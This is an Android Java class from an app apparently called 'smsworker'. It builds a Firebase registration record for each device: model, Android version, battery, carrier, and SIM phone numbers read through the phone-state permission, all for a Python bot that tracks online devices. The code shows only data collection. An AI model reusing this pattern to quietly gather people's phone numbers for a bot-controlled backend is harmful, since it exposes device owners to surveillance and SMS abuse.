package com.u1sman.smsworker;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.BatteryManager;
import android.os.Build;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import androidx.core.app.ActivityCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.ArrayList;
import java.util.List;

/**
 * Builds the Firebase device registration payload.
 * Matches exactly what Python bot's get_online_devices() expects.
 */
public class DeviceManager {
    private final Context context;
    private final AppPrefs prefs;

    public DeviceManager(Context ctx) {
        this.context = ctx;
        this.prefs = new AppPrefs(ctx);
    }

    /** Build full registration JSON for Firebase clients/{deviceId} */
    public JSONObject buildRegistrationPayload() {
        try {
            JSONObject data = new JSONObject();
            data.put("status", true);
            data.put("modelName", Build.MANUFACTURER + " " + Build.MODEL);
            data.put("androidV", "Android " + Build.VERSION.RELEASE);
            data.put("battery", getBatteryLevel());
            data.put("service_provider", getCarrierName());
            data.put("joined", System.currentTimeMillis());

            // SIM info array — bot reads: simSlotIndex, carrierName, phoneNumber
            JSONArray simsArray = getSimsJson();
            data.put("sims", simsArray);

            return data;
        } catch (Exception e) {
            return new JSONObject();
        }
    }

    public JSONArray getSimsJson() {
        JSONArray arr = new JSONArray();
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED) {
                // Return basic sim entries without detailed info
                JSONObject sim0 = new JSONObject();
                sim0.put("simSlotIndex", 0);
                sim0.put("carrierName", "SIM 1");
                sim0.put("phoneNumber", "Unknown");
                arr.put(sim0);
                return arr;
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                SubscriptionManager sm = (SubscriptionManager)
                        context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
                List<SubscriptionInfo> subs = sm != null ? sm.getActiveSubscriptionInfoList() : null;
                if (subs != null && !subs.isEmpty()) {
                    for (SubscriptionInfo info : subs) {
                        JSONObject sim = new JSONObject();
                        sim.put("simSlotIndex", info.getSimSlotIndex());
                        sim.put("carrierName", info.getCarrierName() != null
                                ? info.getCarrierName().toString() : "Unknown");
                        String phone = "Unknown";
                        try { phone = info.getNumber() != null ? info.getNumber() : "Unknown"; }
                        catch (Exception ignored) {}
                        sim.put("phoneNumber", phone);
                        arr.put(sim);
                    }
                    return arr;
                }
            }
        } catch (Exception ignored) {}

        // Fallback: single SIM
        try {
            JSONObject sim = new JSONObject();
            sim.put("simSlotIndex", 0);
            sim.put("carrierName", getCarrierName());
            sim.put("phoneNumber", "Unknown");
            arr.put(sim);
        } catch (Exception ignored) {}
        return arr;
    }

    public int getBatteryLevel() {
        try {
            BatteryManager bm = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
            if (bm != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
            }
        } catch (Exception ignored) {}
        return -1;
    }

    public String getCarrierName() {
        try {
            TelephonyManager tm = (TelephonyManager)
                    context.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null && tm.getNetworkOperatorName() != null
                    && !tm.getNetworkOperatorName().isEmpty()) {
                return tm.getNetworkOperatorName();
            }
        } catch (Exception ignored) {}
        return "Unknown";
    }

    /** Unique device ID stored in prefs */
    public String getDeviceId() {
        return prefs.getDeviceId();
    }
}
